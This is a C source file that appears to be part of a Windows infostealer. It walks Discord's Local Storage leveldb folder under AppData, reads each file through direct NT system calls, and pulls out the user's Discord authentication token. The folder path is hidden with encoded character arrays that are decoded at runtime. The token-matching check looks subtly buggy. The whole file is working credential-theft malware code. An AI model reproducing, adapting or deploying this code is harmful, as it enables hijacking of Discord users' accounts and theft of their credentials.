#include "files.h"
#include "strings.h"

PWSTR searchTokenDirectory() {

	PWSTR retVal = NULL;
	HANDLE dirHandle = INVALID_HANDLE_VALUE, fileHandle = NULL;
	UNICODE_STRING unicodePath;
	OBJECT_ATTRIBUTES objFile = { sizeof(objFile), 0, &unicodePath, OBJ_CASE_INSENSITIVE };
	IO_STATUS_BLOCK isb;
	PFILE_DIRECTORY_INFORMATION dirInfo;
	PVOID dirBuf, fileContent;
	ULONG nextEntryOffset = 0, fileSize = 0;

	WCHAR appDataPath[MAX_PATH];
	WCHAR filePath[MAX_PATH + 5];
	WCHAR str_discordPath[] = { 0x4B, 0x4A, 0x5F, 0x7F, 0x5C, 0x77, 0x04, 0x3B, 0x06, 0x6F, 0x63, 0x42, 0x4B, 0x4C, 0x32, 0x1A, 0x2A, 0x47, 0x65, 0x4F, 0x51, 0x69, 0x63, 0x74, 0x13, 0x29, 0x3F, 0x4F, 0x68, 0x43, 0x76, 0x20 };     /*"\discord\Local Storage\leveldb\" +32 */
	WCHAR str_qual[MAX_PATH + 5] = { 0x4B, 0x11, 0x09, 0x50, 0x3F };     /*"\??\" +5 */

	deobfuscateW(str_discordPath, 32);
	deobfuscateW(str_qual, 5);
	sh_get_folder_path(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
	StringCchCatW(str_qual, MAX_PATH + 5, appDataPath);
	StringCchCatW(str_qual, MAX_PATH, str_discordPath);
	rtl_init_unicode_string(&unicodePath, str_qual);
	
	if ((dirBuf = allocMem(0x1000))
		&& NT_SUCCESS(nt_create_file(&dirHandle, FILE_GENERIC_READ, &objFile, &isb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0))) {

		while (NT_SUCCESS(nt_query_directory_file(dirHandle, NULL, NULL, NULL, &isb, dirBuf, 0x1000, (FILE_INFORMATION_CLASS)1, FALSE, NULL, FALSE))) {

			dirInfo = (PFILE_DIRECTORY_INFORMATION)dirBuf;

			while (!retVal && dirInfo->NextEntryOffset) {

				RtlZeroMemory(filePath, MAX_PATH + 5);
				StringCchCopyW(filePath, MAX_PATH + 5, str_qual);
				StringCchCatW(filePath, MAX_PATH + 5, dirInfo->FileName);
				rtl_init_unicode_string(&unicodePath, filePath);

				if (NT_SUCCESS(nt_create_file(&fileHandle, GENERIC_READ, &objFile, &isb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0))) {

					fileSize = get_file_size(fileHandle, NULL);

					if ((fileContent = allocMem(fileSize))
						&& NT_SUCCESS(nt_read_file(fileHandle, NULL, NULL, NULL, &isb, fileContent, fileSize, NULL, NULL))) {

						retVal = findDiscordToken((PBYTE)fileContent, fileSize);
						freeMem(fileContent);
					}

					nt_close(fileHandle);
				}

				dirInfo = (PFILE_DIRECTORY_INFORMATION)((DWORD_PTR)dirInfo + dirInfo->NextEntryOffset);
			}
		}

		nt_close(dirHandle);
	}
	
	if (dirBuf) freeMem(dirBuf);
	return retVal;
}

PWSTR findDiscordToken(PBYTE fileContent, DWORD fileSize) {

	PWSTR retVal = NULL;
	CHAR token[60];

	for (DWORD i = 0; i < fileSize - 75; i++) {

		if (fileContent[i] != 't'
			&& fileContent[i + 1] == 'o'
			&& fileContent[i + 2] == 'k' 
			&& fileContent[i + 3] == 'e' 
			&& fileContent[i + 4] == 'n'
			&& (retVal = allocMem(DISCORD_TOKEN_DEFAULT_LENGTH + 1 * sizeof(WCHAR)))
			) {

			memcpy(token, fileContent + i + DISCORD_TOKEN_DEFAULT_OFFSET, DISCORD_TOKEN_DEFAULT_LENGTH);
			token[59] = '\0';
			toUnicode(token, retVal);

			break;
		}
	}

	return retVal;
}